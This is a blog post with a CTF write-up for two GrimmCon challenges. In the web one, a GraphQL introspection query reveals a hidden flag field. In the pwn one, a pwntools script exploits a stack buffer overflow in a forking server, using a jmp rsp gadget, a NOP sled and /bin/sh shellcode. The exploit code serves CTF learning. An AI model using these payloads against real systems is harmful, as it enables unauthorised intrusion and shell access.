---
layout: "post"
title: "Two easy problems from GrimmCon CTF"
date: "2021-01-03 08:04:19"
date_gmt: "2021-01-03 08:04:19"
modified: "2021-01-18 07:32:40"
modified_gmt: "2021-01-18 07:32:40"
slug: "two-easy-problems-from-grimmcon-ctf"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2021/01/03/two-easy-problems-from-grimmcon-ctf/"
guid: "http://y4y.space/?p=340"
wordpress_id: 340
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
## Competition Info

https://grimmcon.ctf.games

The website seems permanent down.

## Fruitify (Web)

### Description

Come grab a tasty freshly made juice, they are delicious

### Solution

![](https://y4y.space/wp-content/uploads/2021/01/screenshot-from-2021-01-02-18-38-19.png?w=1024)

Based on the title, I originally thought it's gonna be MongoDB as mango sounds similar to mongo and is a fruit. I clicked around and did not find much, so I clicked the 'view details' button and intercepted it with burp.

Here is the POST request:

```
POST /graphql HTTP/1.1
Host: challenge.ctf.games:32409
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge.ctf.games:32409/juice/3
content-type: application/json
Origin: http://challenge.ctf.games:32409
Content-Length: 244
Connection: close

{"operationName":"JuiceQuery","variables":{"id":"3"},"query":"query JuiceQuery($id: Int!) {\n  juice(id: $id) {\n    name\n    image\n    method\n    ingredients {\n      name\n      quantity\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

As you can see, the request is quite messy. I played around and changed some values and this error message showed up. (I removed the entire string after "query")

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Sun, 03 Jan 2021 02:43:09 GMT
Content-Length: 158
Connection: close

{"data":null,"errors":[{"message":"Syntax Error GraphQL request (1:7) Expected {, found EOF\n\n1: query \n         ^\n","locations":[{"line":1,"column":7}]}]}
```

Then we know the database is GraphQL.

Since I have never interacted with GraphQL so I asked Google for help, and I found some ways to leak the database info in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection).

Here is the request I leaked info about database.

```
{"query":"query {__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}"}
```

The response:

```
{"data":{"__schema":{"directives":[{"args":[{"defaultValue":null,"description":"Included when true.","name":"if","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}}],"description":"Directs the executor to include this field or fragment only when the `if` argument is true.","locations":["FIELD","FRAGMENT_SPREAD","INLINE_FRAGMENT"],"name":"include"},{"args":[{"defaultValue":null,"description":"Skipped when true.","name":"if","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}}],"description":"Directs the executor to skip this field or fragment when the `if` argument is true.","locations":["FIELD","FRAGMENT_SPREAD","INLINE_FRAGMENT"],"name":"skip"},{"args":[{"defaultValue":"\"No longer supported\"","description":"Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formattedin [Markdown](https://daringfireball.net/projects/markdown/).","name":"reason","type":{"kind":"SCALAR","name":"String","ofType":null}}],"description":"Marks an element of a GraphQL schema as no longer supported.","locations":["FIELD_DEFINITION","ENUM_VALUE"],"name":"deprecated"}],"mutationType":null,"queryType":{"name":"Query"},"types":[{"description":"","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"flag","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[{"defaultValue":null,"description":"The id of the juice","name":"id","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Int","ofType":null}}}],"deprecationReason":null,"description":"","isDeprecated":false,"name":"juice","type":{"kind":"OBJECT","name":"Juice","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"juices","type":{"kind":"LIST","name":null,"ofType":{"kind":"OBJECT","name":"Juice","ofType":null}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"Query","possibleTypes":null},{"description":"The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1. ","enumValues":null,"fields":null,"inputFields":null,"interfaces":null,"kind":"SCALAR","name":"Int","possibleTypes":null},{"description":"The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name and description, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"description","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[{"defaultValue":"false","description":"","name":"includeDeprecated","type":{"kind":"SCALAR","name":"Boolean","ofType":null}}],"deprecationReason":null,"description":"","isDeprecated":false,"name":"enumValues","type":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__EnumValue","ofType":null}}}},{"args":[{"defaultValue":"false","description":"","name":"includeDeprecated","type":{"kind":"SCALAR","name":"Boolean","ofType":null}}],"deprecationReason":null,"description":"","isDeprecated":false,"name":"fields","type":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Field","ofType":null}}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"inputFields","type":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__InputValue","ofType":null}}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"interfaces","type":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Type","ofType":null}}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"kind","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"ENUM","name":"__TypeKind","ofType":null}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"name","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"ofType","type":{"kind":"OBJECT","name":"__Type","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"possibleTypes","type":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Type","ofType":null}}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"__Type","possibleTypes":null},{"description":"A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document. \n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"args","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__InputValue","ofType":null}}}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"description","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"locations","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"ENUM","name":"__DirectiveLocation","ofType":null}}}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"name","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"String","ofType":null}}},{"args":[],"deprecationReason":"Use `locations`.","description":"","isDeprecated":true,"name":"onField","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}},{"args":[],"deprecationReason":"Use `locations`.","description":"","isDeprecated":true,"name":"onFragment","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}},{"args":[],"deprecationReason":"Use `locations`.","description":"","isDeprecated":true,"name":"onOperation","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"__Directive","possibleTypes":null},{"description":"A tasty juice","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"The id of the juice","isDeprecated":false,"name":"id","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Int","ofType":null}}},{"args":[],"deprecationReason":null,"description":"Image of the juice","isDeprecated":false,"name":"image","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"Ingredients needed to make the juice","isDeprecated":false,"name":"ingredients","type":{"kind":"LIST","name":null,"ofType":{"kind":"OBJECT","name":"Ingredient","ofType":null}}},{"args":[],"deprecationReason":null,"description":"The method to make the juice","isDeprecated":false,"name":"method","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"The name of the juice","isDeprecated":false,"name":"name","type":{"kind":"SCALAR","name":"String","ofType":null}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"Juice","possibleTypes":null},{"description":"The `Boolean` scalar type represents `true` or `false`.","enumValues":null,"fields":null,"inputFields":null,"interfaces":null,"kind":"SCALAR","name":"Boolean","possibleTypes":null},{"description":"One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"deprecationReason","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"description","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"isDeprecated","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"name","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"String","ofType":null}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"__EnumValue","possibleTypes":null},{"description":"A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.","enumValues":[{"deprecationReason":null,"description":"Location adjacent to a mutation operation.","isDeprecated":false,"name":"MUTATION"},{"deprecationReason":null,"description":"Location adjacent to a subscription operation.","isDeprecated":false,"name":"SUBSCRIPTION"},{"deprecationReason":null,"description":"Location adjacent to an interface definition.","isDeprecated":false,"name":"INTERFACE"},{"deprecationReason":null,"description":"Location adjacent to a union definition.","isDeprecated":false,"name":"UNION"},{"deprecationReason":null,"description":"Location adjacent to an enum definition.","isDeprecated":false,"name":"ENUM"},{"deprecationReason":null,"description":"Location adjacent to an input object type definition.","isDeprecated":false,"name":"INPUT_OBJECT"},{"deprecationReason":null,"description":"Location adjacent to a query operation.","isDeprecated":false,"name":"QUERY"},{"deprecationReason":null,"description":"Location adjacent to a schema definition.","isDeprecated":false,"name":"SCHEMA"},{"deprecationReason":null,"description":"Location adjacent to an input object field definition.","isDeprecated":false,"name":"INPUT_FIELD_DEFINITION"},{"deprecationReason":null,"description":"Location adjacent to a field.","isDeprecated":false,"name":"FIELD"},{"deprecationReason":null,"description":"Location adjacent to a fragment spread.","isDeprecated":false,"name":"FRAGMENT_SPREAD"},{"deprecationReason":null,"description":"Location adjacent to an inline fragment.","isDeprecated":false,"name":"INLINE_FRAGMENT"},{"deprecationReason":null,"description":"Location adjacent to a object definition.","isDeprecated":false,"name":"OBJECT"},{"deprecationReason":null,"description":"Location adjacent to an argument definition.","isDeprecated":false,"name":"ARGUMENT_DEFINITION"},{"deprecationReason":null,"description":"Location adjacent to an enum value definition.","isDeprecated":false,"name":"ENUM_VALUE"},{"deprecationReason":null,"description":"Location adjacent to a fragment definition.","isDeprecated":false,"name":"FRAGMENT_DEFINITION"},{"deprecationReason":null,"description":"Location adjacent to a scalar definition.","isDeprecated":false,"name":"SCALAR"},{"deprecationReason":null,"description":"Location adjacent to a field definition.","isDeprecated":false,"name":"FIELD_DEFINITION"}],"fields":null,"inputFields":null,"interfaces":null,"kind":"ENUM","name":"__DirectiveLocation","possibleTypes":null},{"description":"The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.","enumValues":null,"fields":null,"inputFields":null,"interfaces":null,"kind":"SCALAR","name":"String","possibleTypes":null},{"description":"An ingredient and the quantity","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"The name of the ingredient","isDeprecated":false,"name":"name","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"The quantity of ingredient needed","isDeprecated":false,"name":"quantity","type":{"kind":"SCALAR","name":"String","ofType":null}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"Ingredient","possibleTypes":null},{"description":"A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"A list of all directives supported by this server.","isDeprecated":false,"name":"directives","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Directive","ofType":null}}}}},{"args":[],"deprecationReason":null,"description":"If this server supports mutation, the type that mutation operations will be rooted at.","isDeprecated":false,"name":"mutationType","type":{"kind":"OBJECT","name":"__Type","ofType":null}},{"args":[],"deprecationReason":null,"description":"The type that query operations will be rooted at.","isDeprecated":false,"name":"queryType","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Type","ofType":null}}},{"args":[],"deprecationReason":null,"description":"If this server supports subscription, the type that subscription operations will be rooted at.","isDeprecated":false,"name":"subscriptionType","type":{"kind":"OBJECT","name":"__Type","ofType":null}},{"args":[],"deprecationReason":null,"description":"A list of all types supported by this server.","isDeprecated":false,"name":"types","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Type","ofType":null}}}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"__Schema","possibleTypes":null},{"description":"An enum describing what kind of type a given `__Type` is","enumValues":[{"deprecationReason":null,"description":"Indicates this type is a scalar.","isDeprecated":false,"name":"SCALAR"},{"deprecationReason":null,"description":"Indicates this type is an object. `fields` and `interfaces` are valid fields.","isDeprecated":false,"name":"OBJECT"},{"deprecationReason":null,"description":"Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.","isDeprecated":false,"name":"INTERFACE"},{"deprecationReason":null,"description":"Indicates this type is a union. `possibleTypes` is a valid field.","isDeprecated":false,"name":"UNION"},{"deprecationReason":null,"description":"Indicates this type is an enum. `enumValues` is a valid field.","isDeprecated":false,"name":"ENUM"},{"deprecationReason":null,"description":"Indicates this type is an input object. `inputFields` is a valid field.","isDeprecated":false,"name":"INPUT_OBJECT"},{"deprecationReason":null,"description":"Indicates this type is a list. `ofType` is a valid field.","isDeprecated":false,"name":"LIST"},{"deprecationReason":null,"description":"Indicates this type is a non-null. `ofType` is a valid field.","isDeprecated":false,"name":"NON_NULL"}],"fields":null,"inputFields":null,"interfaces":null,"kind":"ENUM","name":"__TypeKind","possibleTypes":null},{"description":"Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"args","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"LIST","name":null,"ofType":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__InputValue","ofType":null}}}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"deprecationReason","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"description","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"isDeprecated","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"Boolean","ofType":null}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"name","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"String","ofType":null}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"type","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Type","ofType":null}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"__Field","possibleTypes":null},{"description":"Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.","enumValues":null,"fields":[{"args":[],"deprecationReason":null,"description":"A GraphQL-formatted string representing the default value for this input value.","isDeprecated":false,"name":"defaultValue","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"description","type":{"kind":"SCALAR","name":"String","ofType":null}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"name","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"String","ofType":null}}},{"args":[],"deprecationReason":null,"description":"","isDeprecated":false,"name":"type","type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"OBJECT","name":"__Type","ofType":null}}}],"inputFields":null,"interfaces":[],"kind":"OBJECT","name":"__InputValue","possibleTypes":null}]}}}
```

And here is the request to retrieve flag.

```
{"query":"query {flag}"}
```

And response:

```
{"data":{"flag":"flag{5e4e716b08873b04ed7ee8c2d88a5a2e}"}}
```

I still have no idea why the challenge is called fruitity.

### Flag

flag{5e4e716b08873b04ed7ee8c2d88a5a2e}

## Stacked (Pwn)

### Description

Two files were given. One docker file, another actual binary.

### Solution

This one isn't really all that much, but it's cool to debug a forked process like this.

I initially put the binary into cutter (a decompile software), and didn't really look too much into it. All I know is the binary requires a port argument to start. So it should be some kind of server application. I also found a `useful` function which I assume should come to place later.

Then I ran gdb with the binary, start the application on a random port, and connect to it. The response server had for me was just "overflow me", so I put a bunch of junk and try to crash it. However, I realized this binary is not single threaded, which means some forking is happening. Then I set the follow fork mode to child.

```
gdb> set follow-fork-mode child
```

I also neglected to say, this binary does not have any flags set.

![](https://y4y.space/wp-content/uploads/2021/01/screenshot-from-2021-01-02-19-36-06.png?w=621)

So after all that, I generated a cyclic pattern and try to crash it. Note that once the data is sent, the child process is terminated, so in order to continue the debugging, simply find the PID of the server and run `attach <PID>` in gdb.

Then I found the crash point at 1032 characters.

When I was wondering what's next, I remembered the `useful` function. I loaded the binary in cutter again and checked the assembly for that function.

```
  ;-- useful:
2: useful ();
0x00401557      jmp     rsp
0x00401559      nop
0x0040155a      ud2
0x0040155c      nop     dword [rax]
```

Ah, `jmp rsp`, the good 'ol OSCP type of buffer overflow.

So, the rest should be fair. The payload is `junk + jmp_rsp + nop + shellcode`.

After I constructed my payload, it kept failing, which I assume is some kind of bad character at the cause. But I just kept trying different shellcodes, eventually one worked. When I was about to connect to remote server, the challenge website had some technical problems and I was unable to proceed. So I will just leave the local version here.

```
#!/usr/bin/python3

from pwn import *

local = True

#context.log_level = 'debug'
context(arch='amd64', os='linux')
offset = 1032
junk = b'm' * offset
jmp_rsp = 0x00401557
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
nop = b'\x90' * 10

payload = flat(
        junk, jmp_rsp,
        nop, shellcode
        )

if local:
    host = '127.0.0.1'
    port = 9999
    r = remote(host, port)
    r.recvline()
    r.sendline(payload)
    r.interactive()

else:
    host = ''
```

### Flag

idk

## Conclusion

As mentioned above, when I was doing 'stacked', the website seemed down. I checked it afterwards and seems like the entire server is just gone, and I was unable to do more challenges. So that will be all.
{% endraw %}
